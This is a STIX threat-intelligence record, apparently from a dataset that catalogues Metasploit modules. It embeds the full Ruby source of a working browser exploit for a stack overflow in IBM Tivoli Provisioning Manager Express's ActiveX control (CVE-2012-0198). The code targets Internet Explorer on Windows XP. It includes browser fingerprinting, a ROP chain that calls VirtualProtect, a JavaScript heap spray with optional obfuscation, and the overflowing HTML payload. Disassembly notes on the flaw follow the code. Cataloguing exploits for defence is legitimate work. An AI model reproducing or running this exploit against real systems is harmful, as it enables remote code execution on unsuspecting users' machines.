{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db2711f4-02d8-4228-a494-10caac4f7577",
    "created": "2024-08-14T16:40:09.996192Z",
    "modified": "2024-08-14T16:40:09.996196Z",
    "name": "\"IBM Tivoli Provisioning Manager Express for Software Distribution Isig.isigCtl.1 ActiveX RunAndUploadFile() Method Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability in the Isig.isigCtl.1 ActiveX installed with IBM Tivoli Provisioning Manager Express for Software Distribution 4.1.1.  The vulnerability is found in the \"RunAndUploadFile\" method where the \"OtherFields\" parameter with user controlled data is used to build a \"Content-Disposition\" header and attach contents in an insecure way which allows to overflow a buffer in the stack.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ibm_tivoli_pme_activex_bof.rb",
            "external_id": "ibm_tivoli_pme_activex_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0198"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{84B74E82-3475-420E-9949-773B4FB91771}\",\n  #  :method     => \"RunAndUploadFile\",\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Tivoli Provisioning Manager Express for Software Distribution Isig.isigCtl.1 ActiveX RunAndUploadFile() Method Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability in the\n        Isig.isigCtl.1 ActiveX installed with IBM Tivoli Provisioning\n        Manager Express for Software Distribution 4.1.1.\n\n        The vulnerability is found in the \"RunAndUploadFile\" method\n        where the \"OtherFields\" parameter with user controlled data\n        is used to build a \"Content-Disposition\" header and attach\n        contents in an insecure way which allows to overflow a buffer\n        in the stack.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrea Micalizzi aka rgod', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n          'sinn3r' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE',   '2012-0198' ],\n          [ 'OSVDB', '79735' ],\n          [ 'BID',   '52252' ],\n          [ 'ZDI',   '12-040' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1000,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # isig.dll 2.44.282.0\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Rop'         => nil,\n              'Offset'      => 161, # length is strlen(\"submit\") dependant\n              'OffsetShell' => '0x800 - code.length',\n              'ebp'         => 0x09090909,\n              'Ret'         => 0x09090909\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3',\n            {\n              'Rop'         => nil,\n              'Offset'      => 161, # length is strlen(\"submit\") dependant\n              'OffsetShell' => '0x800 - code.length',\n              'ebp'         => 0x09090909,\n              'Ret'         => 0x09090909\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'Rop'         => :jre,\n              'Offset'      => 161, # length is strlen(\"submit\") dependant\n              'OffsetShell' => '0x480',\n              'ebp'         => 0x09090920,\n              'Ret'         => 0x7c375a3d # stackpivot from msvcr71.dll # mov esp, ebp # pop ebp # ret\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-03-01',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n        ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    else\n      return nil\n    end\n  end\n\n  def get_payload(t, cli)\n\n    if t['Rop'].nil?\n      code = \"\"\n    else\n      #Fix the stack to avoid anything busted\n      code = \"\\x81\\xC4\\x54\\xF2\\xFF\\xFF\"\n    end\n    code << payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # ROP chain generated by mona.py - See corelan.be\n    case t['Rop']\n    when :jre\n      print_status(\"Using JRE ROP\")\n      exec_size = 0xffffffff - code.length + 1\n      rop =\n      [\n        0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n        exec_size,   # Value to NEG\n        0x7c347f98,  # RETN (ROP NOP)\n        0x7c3415a2,  # JMP [EAX]\n        0xffffffff,\n        0x7c376402,  # skip 4 bytes\n        0x7c351e05,  # NEG EAX # RETN\n        0x7c345255,  # INC EBX # FPATAN # RETN\n        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n        0x7c344f87,  # POP EDX # RETN\n        0xffffffc0,  # Value to negate, will become 0x00000040\n        0x7c351eb1,  # NEG EDX # RETN\n        0x7c34d201,  # POP ECX # RETN\n        0x7c38b001,  # &Writable location\n        0x7c347f97,  # POP EAX # RETN\n        0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN\n        0x7c345c30,  # ptr to 'push esp #  ret '\n      ].pack(\"V*\")\n    end\n\n    code = rop + code\n    return code\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Client requesting: #{request.uri}\")\n\n    p = get_payload(my_target, cli)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x90\"*4, Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js_spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['OffsetShell']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var i=0; i < 0x1A0; i++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    js_spray = heaplib(js_spray, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)\n      js_spray.obfuscate(memory_sensitive: true)\n    end\n\n    bof = rand_text_alpha(my_target['Offset'])\n    bof << [my_target['ebp']].pack(\"V\") # ebp\n    bof << [my_target.ret].pack(\"V\") # eip\n\n    html = <<-HTML\n    <html>\n    <head>\n    <script>\n      #{js_spray}\n    </script>\n    </head>\n    <object classid='clsid:84B74E82-3475-420E-9949-773B4FB91771' id='isig'></object>\n    <script>\n      var url = \"http://#{Rex::Socket.source_address('1.2.3.4')}:#{datastore['SRVPORT']}/tpmx/uploadEG2.do\";\n      var fields = \"submit:#{bof};FROM_EMAIL:true;userKey:2\";\n      var flags = \"-level5\";\n      msg = isig.RunAndUploadFile(url, fields, flags);\n    </script>\n    </html>\n    HTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n=begin\n\n* Vulnerability notes\n\nThe Dangerous strcat allows to attach user-controlled contents after\nthe Content-disposition header:\n\n.text:100040B0 Src             = byte ptr -100h\n...\n.text:100040DD                 push    [ebp+Source]    ; Source => User controlled via \"fields\" param\n.text:100040E0                 lea     eax, [ebp+Src]\n.text:100040E6                 push    eax             ; Dest => Local variable where the Content-disposition header\n                                                       ; has been stored\n.text:100040E7                 call    _strcat ; strcat used by this module to overflow\n\nFunction isn't protected with stack cookies so get\nthe control flow is easy by overwriting the saved EIP\non the stack.\n\n=end\n",
    "x_mitre_disclosure_date": "2012-03-01",
    "x_mitre_platforms": [
        "win'"
    ]
}